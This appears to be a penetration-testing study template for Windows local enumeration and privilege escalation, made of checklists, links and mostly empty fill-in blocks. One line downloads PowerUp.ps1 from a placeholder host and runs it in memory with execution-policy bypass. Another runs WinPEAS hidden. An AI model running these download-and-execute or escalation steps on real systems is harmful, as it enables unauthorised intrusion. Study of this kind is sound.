---
icon: 🗒
target:
- ""
createdAt: "2025-02-09"
imageNameKey: nota_local_machine_enum_for_maria
tags: 
NoteRel:
---
## Local Machine enumeration Checklist
- [ ] Username, hostname and privileges
- [ ] Groups Memberships of the current user
- [ ] Existing users and groups
- [ ] Operating System, version, arch and security updates
- [ ] Network information
- [ ] installed Applications x64 and x86
- [ ] Running Process
- [ ] Sensitive File Search
- [ ] PowerShell History and Transcript
- [ ] Powershell Env Variables
- [ ] Schedule tasks
- [ ] Services Running

## Privesc Checklist
- [ ] Installed softwares vulnerabilities
- [ ] Schedule Tasks
- [ ] Services Running
- [ ] WinPeas
- [ ] Bloodhound
- [ ] DLL Hijacking
- [ ] winlogon
- [ ] putty

## References
[Windows Privilege Escalation - Situation Awareness](obsidian://open?vault=OSCP-Study-Notes&file=Windows%20Privilege%20Escalation%2FSituational%20Awareness)
https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#windows-version-and-configuration

## Initial executes - Tools Automated

### Winpeas
> cmd
```cmd
wmic process call create "cmd.exe /c C:\temp\winpeas.exe > C:\temp\winpeas.txt"
```

>powershell
```powershell
Start-Process -FilePath "C:\temp\winpeas.exe" -ArgumentList " > C:\temp\output.txt" -WindowStyle Hidden -NoNewWindow
```

### Powerup
```
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://x.x.x.x/wintools/PowerUp.ps1'); Invoke-AllChecks"
```

# Enumeration for (USERNAME)
## hostname and username
```js


```

## User Privileges
```


```

## Group memberships
```js



```

## Sensitive Files By User and Group
```

```

```

```

## Powershell History and Transcript
```js


```

## Powershell Env Variables
```js


```

## Find-LocalAdmins
```

```

## Services Running
- Procura serviços que utilizam executaveis cujo temos permissões de acesso
- Procurar por serviços que estão em diretórios cujo temos permissões de acesso.
- utilizar PowerUp.ps1 para automatizar processo e fazer método manual.
```

```

## Schedule Tasks
- Procurar por tasks cujo o PathName tenha espaço e não tenha aspas
- Procurar por tasks cujo o binário temos permissões de acesso
- Procurar por tasks cujo o binário está num diretório que temos permissão
- Usar powerup.ps1 para automatizar
```

```



# System Enumeration 
## Existing Users and Groups

### Users
```js





```

### Groups
```js


```

## System SO, info, version, arch
```js



```

## Security Patches installed
```js


```

## Network Information
```js


```

```js

```
## Installed Applications
#### Apps x86
```js

```
#### Apps x64
```js
   

```

## Running Process
```js

```

## DLL Hijacking
- Se for possível, baixar o executavel do software e procurar localmente por DLLs vulneraveis.
- Procurar por arquivos de logs de software
- Procurar nome do software na internet e identificar DLLs hijacking conhecidas

```

```
